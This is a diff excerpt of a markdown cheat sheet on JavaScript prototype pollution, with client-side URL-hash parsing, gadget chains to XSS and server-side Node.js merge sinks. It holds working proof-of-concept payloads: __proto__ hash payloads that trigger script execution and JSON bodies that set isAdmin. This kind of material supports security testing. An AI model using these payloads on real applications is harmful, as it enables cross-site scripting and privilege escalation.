@@ -18,6 +18,7 @@ console.log({}.foo)   // "bar"
 ```
 
 URL-hash parsing pattern:
+
 ```js
 // Vulnerable
 const params = {};
@@ -35,11 +36,13 @@ location.hash.slice(1).split('&').forEach(p => {
 ## Gadget chains → XSS
 
 Look for libraries used on the page. Common gadgets:
+
 - jQuery `$.get(url, {...})` reading `ajax.setup` defaults
 - Chart.js / Highcharts config merge
 - Analytics libs that concatenate config into script tag `src`
 
 Polyglot PoC:
+
 ```
 #__proto__[src]=data:,alert(1)//
 #__proto__[html]=<img%20src=x%20onerror=alert(1)>
@@ -51,6 +54,7 @@ Use [PPScan](https://github.com/msrkp/PPScan) Burp extension for automation.
 ## Server-side (Node.js)
 
 Sinks:
+
 - `_.merge(target, untrustedJson)` deep merges attacker-controlled keys.
 - `Object.assign` is safe (shallow, direct).
 - `JSON.parse` alone is safe; danger is what you do with the parsed object.
@@ -66,6 +70,7 @@ app.post('/api/user', (req, res) => {
 ```
 
 PoC body:
+
 ```json
 {"__proto__":{"isAdmin":true}}
 {"constructor":{"prototype":{"isAdmin":true}}}
